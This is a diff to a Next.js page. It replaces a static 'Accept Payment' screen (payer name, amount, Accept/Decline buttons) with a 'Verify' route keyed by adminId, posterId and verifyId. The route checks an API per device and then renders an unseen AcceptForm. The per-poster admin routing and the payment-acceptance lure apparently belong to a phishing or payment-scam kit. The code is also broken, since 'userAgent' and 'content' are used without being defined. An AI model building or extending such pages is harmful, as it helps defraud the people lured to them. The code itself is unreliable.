@@ -1,38 +1,35 @@
 import Image from "next/image";
 import React from "react";
 import { info } from "../../../../../assets/data";
+import AcceptForm from "@/components/AcceptForm";
+import { API_URL, site } from "@/config";
 
-function AcceptPayment() {
-  return (
-    <div className="flex justify-center items-center min-h-screen">
-      <div className="shadow-md rounded-md flex flex-col justify-center items-center  max-w-[500px] w-full gap-4 py-14 px-5">
-        <Image
-          src="/side hustle.webp"
-          alt="img"
-          width={100}
-          height={100}
-          className="rounded-full w-20 h-20 object-cover"
-        />
-        <div className="flex flex-col items-center">
-          <p className="font-semibold">{info.name}</p>
-          <p>Payment from {info.username}</p>
-        </div>
-        <p className="font-medium text-4xl">$ {info.amount}</p>
-        <div className="flex flex-col items-center">
-          <p className="text-gray-500">For Apt</p>
-          <p className="text-gray-500">{info.date}</p>
-        </div>
-        <div className="flex flex-col gap-4 w-full items-center">
-          <button className="bg-green-700 text-white rounded-full w-4/5 py-2 hover:bg-green-600 text-2xl">
-            Accept
-          </button>
-          <button className="bg-yellow-700 text-white rounded-full w-4/5 py-2 hover:bg-yellow-600 text-2xl">
-            Decline
-          </button>
-        </div>
-      </div>
-    </div>
+async function Verify({ params }) {
+  const { adminId, posterId, verifyId } = params;
+  const isMobileView = userAgent.match(
+    /Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i
   );
+
+  const isTabletView = userAgent.match(
+    /Tablet|iPad|Playbook|Silk|Kindle|(Android(?!.*Mobile))/i
+  );
+
+  const device = isMobileView ? "phone" : isTabletView ? "ipad" : "desktop";
+
+  const url = `${API_URL}/${site}/${adminId}/${posterId}/${verifyId}/${device}`;
+
+  const res = await fetch(url);
+  const data = await res.json();
+  console.log(data);
+  if (data?.success !== "exists") {
+    content = <div className="col-span-12">No Page found!!</div>;
+  }
+  if (data?.success == "exists") {
+    // content= <div className="col-span-12">Page found!!</div>
+
+    content = <AcceptForm sitename={data?.sitename} />;
+  }
+  return <div>{content}</div>;
 }
 
-export default AcceptPayment;
+export default Verify;
